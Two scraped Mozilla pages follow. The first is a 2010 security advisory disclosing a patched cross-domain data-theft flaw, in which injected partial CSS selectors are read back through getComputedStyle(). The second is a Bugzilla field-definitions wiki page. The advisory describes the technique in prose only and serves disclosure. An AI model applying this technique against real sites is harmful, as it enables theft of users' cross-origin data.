  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2010-46

## Cross-domain data theft using CSS

Announced
July 20, 2010
Reporter
Chris Evans
Impact
Moderate
Products
Firefox, SeaMonkey, Thunderbird
Fixed in

* Firefox 3.5.11
* Firefox 3.6.7
* SeaMonkey 2.0.6
* Thunderbird 3.0.6
* Thunderbird 3.1.1

### Description

Google security researcher **Chris Evans** reported
that data can be read across domains by injecting bogus CSS selectors
into a target site and then retrieving the data using JavaScript APIs.
If an attacker can inject opening and closing portions of a CSS
selector into points A and B of a target page, then the region between
the two injection points becomes readable to JavaScript through, for
example, the `getComputedStyle()` API.

### References

* <https://bugzilla.mozilla.org/show_bug.cgi?id=524223>
* [CVE-2010-0654](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0654)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_04480c11_20250126_115045.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)


